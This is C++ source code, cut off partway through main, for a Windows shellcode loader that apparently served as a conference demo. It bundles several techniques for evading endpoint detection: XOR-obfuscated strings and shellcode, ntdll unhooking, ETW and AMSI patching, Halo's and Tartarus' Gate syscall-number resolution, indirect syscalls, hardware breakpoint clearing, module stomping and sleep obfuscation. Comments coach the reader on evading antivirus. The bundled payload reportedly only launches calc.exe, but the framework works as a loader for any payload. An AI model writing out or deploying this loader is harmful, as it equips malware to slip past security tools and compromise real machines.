// Warning: This code can potentially be used to create or deploy malware.
// It is provided strictly for educational and research purposes.
// I do not assume any responsibility for misuse, damage, or illegal activity resulting from its use.

// Oh, you definitely shouldn't obfuscate your code or hide strings like ntdll.dll
// that would make it way too hard for EDRs to detect. Whatever you do, don't do that.😉
#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <cstring>
#include <vector>
#include <algorithm>
#include <cstdint>

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS 0x00000000
#endif

#define RVA2VA(Type, DllBase, Rva) (Type)((ULONG_PTR)DllBase + Rva)

constexpr unsigned char XOR_KEY = 0x5A;
constexpr unsigned char SSN_XOR_KEY = 0xA5;  // Separate key for SSN obfuscation


// XOR-Encrypted Strings
unsigned char enc_ntdll[] = { 0x34, 0x2E, 0x3E, 0x36, 0x36, 0x74, 0x3E, 0x36, 0x36, 0x5A };
unsigned char enc_kernelbase[] = { 0x31, 0x3F, 0x28, 0x34, 0x3F, 0x36, 0x38, 0x3B, 0x29, 0x3F, 0x74, 0x3E, 0x36, 0x36, 0x5A };
unsigned char enc_Alloc[] = { 0x14, 0x2E, 0x1B, 0x36, 0x36, 0x35, 0x39, 0x3B, 0x2E, 0x3F, 0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23, 0x5A };
unsigned char enc_Write[] = { 0x14, 0x2E, 0x0D, 0x28, 0x33, 0x2E, 0x3F, 0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23, 0x5A };
unsigned char enc_Protect[] = { 0x14, 0x2E, 0x0A, 0x28, 0x35, 0x2E, 0x3F, 0x39, 0x2E, 0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23, 0x5A };
unsigned char enc_QueueApc[] = { 0x14, 0x2E, 0x0B, 0x2F, 0x3F, 0x2F, 0x3F, 0x1B, 0x2A, 0x39, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E, 0x5A };
unsigned char enc_EtwEventWrite[] = { 0x1F, 0x2E, 0x2D, 0x1F, 0x2C, 0x3F, 0x34, 0x2E, 0x0D, 0x28, 0x33, 0x2E, 0x3F, 0x5A };
unsigned char enc_version[] = { 0x2C, 0x3F, 0x28, 0x29, 0x33, 0x35, 0x34, 0x74, 0x3E, 0x36, 0x36, 0x5A };
unsigned char enc_kernel32[] = { 0x31, 0x3F, 0x28, 0x34, 0x3F, 0x36, 0x69, 0x69, 0x68, 0x74, 0x3E, 0x36, 0x36, 0x5A };
unsigned char enc_amsi[] = { 0x32, 0x3B, 0x29, 0x33, 0x74, 0x36, 0x3C, 0x3C, 0x5A };

// SSN Obfuscation (XOR with 0xA5)
// Real SSNs are encrypted at compile time
#define OBFUSCATE_SSN(ssn) ((ssn) ^ SSN_XOR_KEY)

// Encrypted SSNs (decrypted at runtime)
// Example: NtAllocateVirtualMemory SSN = 0x18 → 0x18 ^ 0xA5 = 0xBD
DWORD g_enc_ssn_alloc = OBFUSCATE_SSN(0x18);  // NtAllocateVirtualMemory
DWORD g_enc_ssn_write = OBFUSCATE_SSN(0x3A);  // NtWriteVirtualMemory
DWORD g_enc_ssn_prot = OBFUSCATE_SSN(0x50);  // NtProtectVirtualMemory
DWORD g_enc_ssn_apc = OBFUSCATE_SSN(0x45);  // NtQueueApcThread

// XOR-Encrypted Shellcode (calc.exe)
unsigned char enc_shellcode[] = {
    0xA6, 0x12, 0xD9, 0xBE, 0xAA, 0xB2, 0x9A, 0x5A, 0x5A, 0x5A, 0x1B, 0x0B,
    0x1B, 0x0A, 0x08, 0x0B, 0x0C, 0x12, 0x6B, 0x88, 0x3F, 0x12, 0xD1, 0x08,
    0x3A, 0x12, 0xD1, 0x08, 0x42, 0x12, 0xD1, 0x08, 0x7A, 0x12, 0xD1, 0x28,
    0x0A, 0x12, 0x55, 0xED, 0x10, 0x10, 0x17, 0x6B, 0x93, 0x12, 0x6B, 0x9A,
    0xF6, 0x66, 0x3B, 0x26, 0x58, 0x76, 0x7A, 0x1B, 0x9B, 0x93, 0x57, 0x1B,
    0x5B, 0x9B, 0xB8, 0xB7, 0x08, 0x1B, 0x0B, 0x12, 0xD1, 0x08, 0x7A, 0xD1,
    0x18, 0x66, 0x12, 0x5B, 0x8A, 0xD1, 0xDA, 0xD2, 0x5A, 0x5A, 0x5A, 0x12,
    0xDF, 0x9A, 0x2E, 0x3D, 0x12, 0x5B, 0x8A, 0x0A, 0xD1, 0x12, 0x42, 0x1E,
    0xD1, 0x1A, 0x7A, 0x13, 0x5B, 0x8A, 0xB9, 0x0C, 0x12, 0xA5, 0x93, 0x1B,
    0xD1, 0x6E, 0xD2, 0x12, 0x5B, 0x8C, 0x17, 0x6B, 0x93, 0x12, 0x6B, 0x9A,
    0xF6, 0x1B, 0x9B, 0x93, 0x57, 0x1B, 0x5B, 0x9B, 0x62, 0xBA, 0x2F, 0xAB,
    0x16, 0x59, 0x16, 0x7E, 0x52, 0x1F, 0x63, 0x8B, 0x2F, 0x82, 0x02, 0x1E,
    0xD1, 0x1A, 0x7E, 0x13, 0x5B, 0x8A, 0x3C, 0x1B, 0xD1, 0x56, 0x12, 0x1E,
    0xD1, 0x1A, 0x46, 0x13, 0x5B, 0x8A, 0x1B, 0xD1, 0x5E, 0xD2, 0x12, 0x5B,
    0x8A, 0x1B, 0x02, 0x1B, 0x02, 0x04, 0x03, 0x00, 0x1B, 0x02, 0x1B, 0x03,
    0x1B, 0x00, 0x12, 0xD9, 0xB6, 0x7A, 0x1B, 0x08, 0xA5, 0xBA, 0x02, 0x1B,
    0x03, 0x00, 0x12, 0xD1, 0x48, 0xB3, 0x0D, 0xA5, 0xA5, 0xA5, 0x07, 0x12,
    0xE0, 0x5B, 0x5A, 0x5A, 0x5A, 0x5A, 0x5A, 0x5A, 0x5A, 0x12, 0xD7, 0xD7,
    0x5B, 0x5B, 0x5A, 0x5A, 0x1B, 0xE0, 0x6B, 0xD1, 0x35, 0xDD, 0xA5, 0x8F,
    0xE1, 0xBA, 0x47, 0x70, 0x50, 0x1B, 0xE0, 0xFC, 0xCF, 0xE7, 0xC7, 0xA5,
    0x8F, 0x12, 0xD9, 0x9E, 0x72, 0x66, 0x5C, 0x26, 0x50, 0xDA, 0xA1, 0xBA,
    0x2F, 0x5F, 0xE1, 0x1D, 0x49, 0x28, 0x35, 0x30, 0x5A, 0x03, 0x1B, 0xD3,
    0x80, 0xA5, 0x8F, 0x39, 0x3B, 0x36, 0x39, 0x74, 0x3F, 0x22, 0x3F, 0x5A,
    0x99,
};  // Harmless only opens calc.exe

// Deadass: dont use msfvenom shellcode, it will be instantly flagged by EDR and Antivirus

constexpr size_t shellcode_len = sizeof(enc_shellcode);

// Helpers
void xor_crypt(unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; i++) data[i] ^= XOR_KEY;
}

void SecureZero(void* ptr, size_t cnt) {
    volatile unsigned char* p = (volatile unsigned char*)ptr;
    while (cnt--) *p++ = 0;
}

char* DecryptString(unsigned char* encrypted, size_t length) {
    char* decrypted = new char[length];
    memcpy(decrypted, encrypted, length);
    xor_crypt((unsigned char*)decrypted, length);
    return decrypted;
}

// PE Parser | Manual API Resolution

PIMAGE_EXPORT_DIRECTORY GetExportDirectory(HMODULE hModule) {
    if (!hModule) return nullptr;
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    PIMAGE_NT_HEADERS64 pNtHeaders = RVA2VA(PIMAGE_NT_HEADERS64, hModule, pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return nullptr;
    IMAGE_DATA_DIRECTORY exportDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0 || exportDir.Size == 0) return nullptr;
    return RVA2VA(PIMAGE_EXPORT_DIRECTORY, hModule, exportDir.VirtualAddress);
}

PVOID GetFunctionAddress(HMODULE hModule, const char* functionName) {
    if (!hModule) return nullptr;
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS64 pNtHeaders = RVA2VA(PIMAGE_NT_HEADERS64, hModule, pDosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY pExportDir = RVA2VA(PIMAGE_EXPORT_DIRECTORY, hModule, exportDir.VirtualAddress);

    PDWORD addressOfNames = RVA2VA(PDWORD, hModule, pExportDir->AddressOfNames);
    PWORD addressOfNameOrdinals = RVA2VA(PWORD, hModule, pExportDir->AddressOfNameOrdinals);
    PDWORD addressOfFunctions = RVA2VA(PDWORD, hModule, pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        LPCSTR currentName = RVA2VA(LPCSTR, hModule, addressOfNames[i]);
        if (strcmp(currentName, functionName) == 0) {
            WORD ordinal = addressOfNameOrdinals[i];
            PVOID functionAddress = RVA2VA(PVOID, hModule, addressOfFunctions[ordinal]);
            DWORD funcRVA = (DWORD)((ULONG_PTR)functionAddress - (ULONG_PTR)hModule);

            // Handle DLL Forwarding (e.g., to kernelbase.dll)
            if (funcRVA >= exportDir.VirtualAddress && funcRVA < exportDir.VirtualAddress + exportDir.Size) {
                char* kb_name = DecryptString(enc_kernelbase, sizeof(enc_kernelbase));
                HMODULE hKernelBase = GetModuleHandleA(kb_name);
                SecureZero(kb_name, sizeof(enc_kernelbase));
                delete[] kb_name;
                if (hKernelBase) return GetFunctionAddress(hKernelBase, functionName);
            }
            return functionAddress;
        }
    }
    return nullptr;
}

struct ExportEntry {
    std::string name;
    DWORD rva;
    ExportEntry(std::string n, DWORD r) : name(std::move(n)), rva(r) {}
};

std::vector<ExportEntry> parse_exports(HMODULE hModule) {
    std::vector<ExportEntry> exports;
    PIMAGE_EXPORT_DIRECTORY pExportDir = GetExportDirectory(hModule);
    if (!pExportDir) return exports;

    PDWORD addressOfNames = RVA2VA(PDWORD, hModule, pExportDir->AddressOfNames);
    PWORD addressOfNameOrdinals = RVA2VA(PWORD, hModule, pExportDir->AddressOfNameOrdinals);
    PDWORD addressOfFunctions = RVA2VA(PDWORD, hModule, pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        LPCSTR name = RVA2VA(LPCSTR, hModule, addressOfNames[i]);
        DWORD rva = addressOfFunctions[addressOfNameOrdinals[i]];
        exports.emplace_back(name, rva);
    }
    return exports;
}

// HALO'S GATE | Memory Scan for SSN Resolution
// Scans memory around hooked function to find unhooked neighbor

DWORD get_ssn_halo(PVOID funcAddr) {
    PBYTE pFunc = (PBYTE)funcAddr;

    // Check if function is already unhooked
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1 && pFunc[3] == 0xB8) {
        return *(PDWORD)(pFunc + 4);
    }

    // Scan backwards (lower addresses -> lower SSNs)
    int distance = 0;
    for (int i = 1; i < 1024; ++i) {
        PBYTE p = pFunc - i;
        if ((p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1) || p[0] == 0xE9) {
            if (p[-1] == 0xC3 || p[-1] == 0xCC || p[-1] == 0x00) {
                distance++;
                if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
                    return *(PDWORD)(p + 4) + distance;
                }
            }
        }
    }

    // Scan forwards (higher addresses -> higher SSNs)
    distance = 0;
    for (int i = 1; i < 1024; ++i) {
        PBYTE p = pFunc + i;
        if ((p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1) || p[0] == 0xE9) {
            if (p[-1] == 0xC3 || p[-1] == 0xCC || p[-1] == 0x00) {
                distance++;
                if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
                    return *(PDWORD)(p + 4) - distance;
                }
            }
        }
    }
    return 0;
}

// TARTARUS GATE - RVA-Sorted Fallback
// Searches for unhooked neighbors by RVA proximity
DWORD get_ssn_tartarus(HMODULE nTdll, const std::vector<ExportEntry>& exports, const char* functionName) {
    std::vector<ExportEntry> sorted = exports;
    std::sort(sorted.begin(), sorted.end(), [](const ExportEntry& a, const ExportEntry& b) {
        return a.rva < b.rva;
        });

    int targetPos = -1;
    for (int i = 0; i < (int)sorted.size(); i++) {
        if (sorted[i].name == functionName) { targetPos = i; break; }
    }
    if (targetPos == -1) return 0;

    for (int d = 1; d < 50; d++) {
        int pos = targetPos - d;
        if (pos >= 0) {
            PBYTE nb = (PBYTE)nTdll + sorted[pos].rva;
            if (nb[0] == 0x4C && nb[1] == 0x8B && nb[2] == 0xD1 && nb[3] == 0xB8 &&
                sorted[pos].name.substr(0, 2) == "Nt") {
                return *(PDWORD)(nb + 4) + d;
            }
        }
        pos = targetPos + d;
        if (pos < (int)sorted.size()) {
            PBYTE nb = (PBYTE)nTdll + sorted[pos].rva;
            if (nb[0] == 0x4C && nb[1] == 0x8B && nb[2] == 0xD1 && nb[3] == 0xB8 &&
                sorted[pos].name.substr(0, 2) == "Nt") {
                return *(PDWORD)(nb + 4) - d;
            }
        }
    }
    return 0;
}

// Master resolver: tries Halo first, falls back to Tartarus
DWORD get_best_ssn(HMODULE nTdll, const std::vector<ExportEntry>& exports, const char* functionName) {
    PVOID funcAddr = GetFunctionAddress(nTdll, functionName);
    if (!funcAddr) return 0;

    DWORD ssn = get_ssn_halo(funcAddr);
    if (ssn != 0) return ssn;

    return get_ssn_tartarus(nTdll, exports, functionName);
}

// SYSCALL GADGET FINDER
// Locates "syscall; ret" (0F 05 C3) gadget in ntdll.dll
// for indirect syscall execution
PVOID FindSyscallGadget(HMODULE hModule) {
    if (!hModule) return nullptr;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS64 pNtHeaders = RVA2VA(PIMAGE_NT_HEADERS64, hModule, pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            PBYTE sectionStart = (PBYTE)hModule + pSection[i].VirtualAddress;
            SIZE_T sectionSize = pSection[i].Misc.VirtualSize;

            for (SIZE_T j = 0; j < sectionSize - 3; j++) {
                if (sectionStart[j] == 0x0F &&
                    sectionStart[j + 1] == 0x05 &&
                    sectionStart[j + 2] == 0xC3) {
                    return sectionStart + j;
                }
            }
        }
    }
    return nullptr;
}

// HARDWARE BREAKPOINT DETECTION & CLEARING
// Detects and removes hardware breakpoints set by EDRs
// EDRs use Dr0-Dr7 registers to track suspicious functions
void ClearHardwareBreakpoints() {
    std::cout << "    [*] Checking for Hardware Breakpoints..." << std::endl;

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(GetCurrentThread(), &ctx)) {
        std::cerr << "    [-] GetThreadContext failed!" << std::endl;
        return;
    }

    bool breakpointsFound = false;

    // Check all 4 debug registers
    if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0) {
        std::cout << "    [!] Hardware Breakpoints detected!" << std::endl;
        std::cout << "    [!] Dr0: 0x" << std::hex << ctx.Dr0 << std::endl;
        std::cout << "    [!] Dr1: 0x" << std::hex << ctx.Dr1 << std::endl;
        std::cout << "    [!] Dr2: 0x" << std::hex << ctx.Dr2 << std::endl;
        std::cout << "    [!] Dr3: 0x" << std::hex << ctx.Dr3 << std::endl;
        breakpointsFound = true;

        // Clear all breakpoints
        ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
        ctx.Dr6 = ctx.Dr7 = 0;

        if (!SetThreadContext(GetCurrentThread(), &ctx)) {
            std::cerr << "    [-] SetThreadContext failed!" << std::endl;
            return;
        }

        std::cout << "    [+] Hardware Breakpoints cleared!" << std::endl;
    }
    else {
        std::cout << "    [+] No Hardware Breakpoints detected." << std::endl;
    }
}

// NTDLL UNHOOKING
// Loads fresh ntdll.dll from disk and overwrites the .text
// section in the in-memory (hooked) version to remove EDR hooks
bool UnhookNtdll(HMODULE hNtdll) {
    std::cout << "    [*] Loading fresh ntdll.dll from disk..." << std::endl;

    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "    [-] Failed to open ntdll.dll from disk!" << std::endl;
        return false;
    }

    HANDLE hMapping = CreateFileMappingA(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    if (!hMapping) {
        CloseHandle(hFile);
        return false;
    }

    PVOID pCleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pCleanNtdll) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS64 pNtHeaders = RVA2VA(PIMAGE_NT_HEADERS64, pCleanNtdll, pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

    PVOID pTextSectionClean = nullptr;
    SIZE_T textSize = 0;

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (strncmp((char*)pSection[i].Name, ".text", 5) == 0) {
            pTextSectionClean = (PBYTE)pCleanNtdll + pSection[i].VirtualAddress;
            textSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }

    if (!pTextSectionClean || textSize == 0) {
        UnmapViewOfFile(pCleanNtdll);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    PVOID pTextSectionHooked = (PBYTE)hNtdll + ((PBYTE)pTextSectionClean - (PBYTE)pCleanNtdll);

    DWORD oldProtect = 0;
    if (!VirtualProtect(pTextSectionHooked, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        UnmapViewOfFile(pCleanNtdll);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    memcpy(pTextSectionHooked, pTextSectionClean, textSize);
    VirtualProtect(pTextSectionHooked, textSize, oldProtect, &oldProtect);

    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    std::cout << "    [+] ntdll.dll unhooked! (" << std::dec << textSize << " bytes restored)" << std::endl;
    return true;
}

// ETW PATCHING
// Overwrites EtwEventWrite with "ret" to prevent event logging
// to Windows Defender / Microsoft Sentinel
bool PatchETW(HMODULE hNtdll) {
    char* fn_etw = DecryptString(enc_EtwEventWrite, sizeof(enc_EtwEventWrite));
    PVOID pEtwEventWrite = GetFunctionAddress(hNtdll, fn_etw);
    SecureZero(fn_etw, sizeof(enc_EtwEventWrite));
    delete[] fn_etw;

    if (!pEtwEventWrite) {
        std::cerr << "    [-] Could not find EtwEventWrite!" << std::endl;
        return false;
    }

    DWORD oldProtect = 0;
    if (!VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }

    *(PBYTE)pEtwEventWrite = 0xC3;
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);

    std::cout << "    [+] ETW patched! EtwEventWrite now returns immediately." << std::endl;
    return true;
}

// AMSI BYPASS
// Patches AmsiScanBuffer in amsi.dll to prevent memory scans
bool PatchAMSI() {
    std::cout << "    [*] Patching AMSI (AmsiScanBuffer)..." << std::endl;

    // Load amsi.dll
    char* fn_amsi = DecryptString(enc_amsi, sizeof(enc_amsi));
    HMODULE hAmsi = GetModuleHandleA(fn_amsi);
    if (!hAmsi) {
        hAmsi = LoadLibraryA(fn_amsi);
    }
    SecureZero(fn_amsi, sizeof(enc_amsi));
    delete[] fn_amsi;

    if (!hAmsi) {
        std::cout << "    [-] amsi.dll not loaded, skipping AMSI patch..." << std::endl;
        return false;
    }

    // Find AmsiScanBuffer
    PVOID pAmsiScanBuffer = GetFunctionAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        std::cout << "    [-] Could not find AmsiScanBuffer!" << std::endl;
        return false;
    }

    // Change protection to RW
    DWORD oldProtect = 0;
    if (!VirtualProtect(pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        std::cout << "    [-] VirtualProtect failed for AMSI!" << std::endl;
        return false;
    }

    // Overwrite with "ret"
    *(PBYTE)pAmsiScanBuffer = 0xC3;

    // Restore protection
    VirtualProtect(pAmsiScanBuffer, 1, oldProtect, &oldProtect);

    std::cout << "    [+] AMSI patched! AmsiScanBuffer now returns immediately." << std::endl;
    return true;
}

// MODULE STOMPING
// Overwrites .text section of a legitimate DLL with shellcode
// Makes the shellcode appear as legitimate code to EDRs
struct ModuleStompResult {
    PVOID shellcodeAddr;
    SIZE_T shellcodeSize;
    DWORD oldProtect;
    bool success;
};

ModuleStompResult StompModule(const char* dllName, const unsigned char* shellcode, SIZE_T shellcodeSize) {
    ModuleStompResult result = { nullptr, 0, 0, false };

    HMODULE hModule = LoadLibraryA(dllName);
    if (!hModule) {
        std::cerr << "    [-] Failed to load " << dllName << std::endl;
        return result;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS64 pNtHeaders = RVA2VA(PIMAGE_NT_HEADERS64, hModule, pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

    PVOID pTextSection = nullptr;
    SIZE_T textSize = 0;

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (strncmp((char*)pSection[i].Name, ".text", 5) == 0) {
            pTextSection = (PBYTE)hModule + pSection[i].VirtualAddress;
            textSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }

    if (!pTextSection || textSize < shellcodeSize) {
        std::cerr << "    [-] .text section too small or not found!" << std::endl;
        return result;
    }

    DWORD oldProtect = 0;
    if (!VirtualProtect(pTextSection, textSize, PAGE_READWRITE, &oldProtect)) {
        std::cerr << "    [-] VirtualProtect failed!" << std::endl;
        return result;
    }

    memcpy(pTextSection, shellcode, shellcodeSize);
    VirtualProtect(pTextSection, textSize, PAGE_EXECUTE_READ, &oldProtect);

    result.shellcodeAddr = pTextSection;
    result.shellcodeSize = shellcodeSize;
    result.oldProtect = oldProtect;
    result.success = true;

    std::cout << "    [+] Module stomped! Shellcode at: 0x" << std::hex << pTextSection << std::endl;
    std::cout << "    [+] Looks like legitimate " << dllName << " code to EDRs!" << std::endl;

    return result;
}

// SLEEP OBFUSCATION
// Encrypts shellcode during sleep to evade memory scans
bool SleepObfuscation(PVOID shellcodeAddr, SIZE_T shellcodeSize, DWORD milliseconds) {
    std::cout << "    [*] Starting sleep obfuscation..." << std::endl;
    std::cout << "    [*] Encrypting shellcode in memory..." << std::endl;

    PBYTE pShellcode = (PBYTE)shellcodeAddr;

    DWORD oldProtect = 0;
    if (!VirtualProtect(pShellcode, shellcodeSize, PAGE_READWRITE, &oldProtect)) {
        std::cerr << "    [-] VirtualProtect failed!" << std::endl;
        return false;
    }

    for (SIZE_T i = 0; i < shellcodeSize; i++) {
        pShellcode[i] ^= XOR_KEY;
    }

    std::cout << "    [*] Sleeping (" << std::dec << milliseconds << "ms)..." << std::endl;
    std::cout << "    [*] EDR sees only encrypted garbage in memory!" << std::endl;

    Sleep(milliseconds);

    std::cout << "    [*] Decrypting shellcode..." << std::endl;
    for (SIZE_T i = 0; i < shellcodeSize; i++) {
        pShellcode[i] ^= XOR_KEY;
    }

    VirtualProtect(pShellcode, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

    std::cout << "    [+] Sleep obfuscation complete!" << std::endl;
    return true;
}

// SSN OBFUSCATION HELPER
// Decrypts SSNs at runtime
DWORD DecryptSSN(DWORD encryptedSSN) {
    return encryptedSSN ^ SSN_XOR_KEY;
}

// Assembly Wrappers (Indirect Syscalls)
// Implemented in syscalls.asm
extern "C" {
    long long IndirectSyscall6(long long ssn, HANDLE p1, PVOID p2, ULONG_PTR p3, PSIZE_T p4, ULONG p5, ULONG p6, PVOID gadget);
    long long IndirectSyscall5(long long ssn, HANDLE p1, PVOID p2, PVOID p3, PVOID p4, PVOID p5, PVOID gadget);
}

int main() {
    std::cout << "============================================================" << std::endl;
    std::cout << "  DEF CON ULTIMATE: All Features Combined" << std::endl;
    std::cout << "  - HW Breakpoint Detection & Clearing" << std::endl;
    std::cout << "  - ntdll Unhooking" << std::endl;
    std::cout << "  - ETW Patching" << std::endl;
    std::cout << "  - AMSI Bypass" << std::endl;
    std::cout << "  - SSN Obfuscation" << std::endl;
    std::cout << "  - Module Stomping" << std::endl;
    std::cout << "  - Indirect Syscalls" << std::endl;
    std::cout << "  - Halo/Tartarus Gate" << std::endl;
    std::cout << "  - String/Shellcode Encryption" << std::endl;
    std::cout << "  - APC Injection + Sleep Obfuscation" << std::endl;
    std::cout << "============================================================" << std::endl;

    // Step 0: HW BREAKPOINT DETECTION (First thing!)
    std::cout << "\n[0] Checking for Hardware Breakpoints..." << std::endl;
    ClearHardwareBreakpoints();

    // Step 1: Load ntdll.dll
    char* dll_name = DecryptString(enc_ntdll, sizeof(enc_ntdll));
    std::cout << "\n[1] Loading " << dll_name << "..." << std::endl;
    HMODULE hNtdll = GetModuleHandleA(dll_name);
    SecureZero(dll_name, sizeof(enc_ntdll));
    delete[] dll_name;

    if (!hNtdll) {
        std::cerr << "[-] Failed to get ntdll handle!" << std::endl;
        return 1;
    }

    // Step 2: NTDLL UNHOOKING
    std::cout << "\n[2] Unhooking ntdll.dll (removing EDR hooks)..." << std::endl;
    if (!UnhookNtdll(hNtdll)) {
        std::cerr << "[-] ntdll unhooking failed!" << std::endl;
        return 1;
    }

    // Step 3: Parse exports
    std::cout << "\n[3] Parsing export table (clean ntdll)..." << std::endl;
    std::vector<ExportEntry> exports = parse_exports(hNtdll);
    std::cout << "    Found " << exports.size() << " exports" << std::endl;

    // Step 4: ETW PATCHING
    std::cout << "\n[4] Patching ETW (EtwEventWrite)..." << std::endl;
    if (!PatchETW(hNtdll)) {
        std::cerr << "[-] ETW patching failed!" << std::endl;
        return 1;
    }

    // Step 5: AMSI BYPASS
    std::cout << "\n[5] Patching AMSI (AmsiScanBuffer)..." << std::endl;
    PatchAMSI();  // Optional - skipped if amsi.dll is not loaded

    // Step 6: Find syscall gadget
    std::cout << "\n[6] Finding syscall gadget in ntdll.dll..." << std::endl;
    PVOID syscallGadget = FindSyscallGadget(hNtdll);
    if (!syscallGadget) {
        std::cerr << "[-] Failed to find syscall gadget!" << std::endl;
        return 1;
    }
    std::cout << "    Syscall gadget at: 0x" << syscallGadget << std::endl;

    // Step 7: Resolve Syscall Numbers (overwrites obfuscated SSNs!)
    std::cout << "\n[7] Resolving Syscall Numbers..." << std::endl;

    // Decrypt SSNs and overwrite the obfuscated values
    g_enc_ssn_alloc = DecryptSSN(g_enc_ssn_alloc);
    g_enc_ssn_write = DecryptSSN(g_enc_ssn_write);
    g_enc_ssn_prot = DecryptSSN(g_enc_ssn_prot);
    g_enc_ssn_apc = DecryptSSN(g_enc_ssn_apc);

    std::cout << "    SSNs decrypted at runtime (not in memory as plaintext!)" << std::endl;

    // Verify with Halo/Tartarus (optional, for debugging)
    char* fn_alloc = DecryptString(enc_Alloc, sizeof(enc_Alloc));
    char* fn_write = DecryptString(enc_Write, sizeof(enc_Write));
    char* fn_prot = DecryptString(enc_Protect, sizeof(enc_Protect));
    char* fn_apc = DecryptString(enc_QueueApc, sizeof(enc_QueueApc));

    DWORD ssn_alloc = get_best_ssn(hNtdll, exports, fn_alloc);
    DWORD ssn_write = get_best_ssn(hNtdll, exports, fn_write);
    DWORD ssn_prot = get_best_ssn(hNtdll, exports, fn_prot);
    DWORD ssn_apc = get_best_ssn(hNtdll, exports, fn_apc);

    // If resolution fails, use the obfuscated SSNs
    if (ssn_alloc == 0) ssn_alloc = g_enc_ssn_alloc;
    if (ssn_write == 0) ssn_write = g_enc_ssn_write;
    if (ssn_prot == 0) ssn_prot = g_enc_ssn_prot;
    if (ssn_apc == 0) ssn_apc = g_enc_ssn_apc;

    if (ssn_alloc == 0 || ssn_write == 0 || ssn_prot == 0 || ssn_apc == 0) {
        std::cerr << "[-] Failed to resolve SSNs!" << std::endl;
        return 1;
    }

    SecureZero(fn_alloc, sizeof(enc_Alloc));
    SecureZero(fn_write, sizeof(enc_Write));
    SecureZero(fn_prot, sizeof(enc_Protect));
    SecureZero(fn_apc, sizeof(enc_QueueApc));
    delete[] fn_alloc;
    delete[] fn_write;
    delete[] fn_prot;
    delete[] fn_apc;

    // Step 8: Decrypt shellcode
    std::cout << "\n[8] Decrypting shellcode..." << std::endl;
    unsigned char* shellcode = new unsigned char[shellcode_len];
    memcpy(shellcode, enc_shellcode, shellcode_len);
    xor_crypt(shellcode, shellcode_len);

    // Step 9: MODULE STOMPING
    std::cout << "\n[9] Module Stomping (injecting into version.dll)..." << std::endl;
    char* fn_version = DecryptString(enc_version, sizeof(enc_version));
    ModuleStompResult stompResult = StompModule(fn_version, shellcode, shellcode_len);
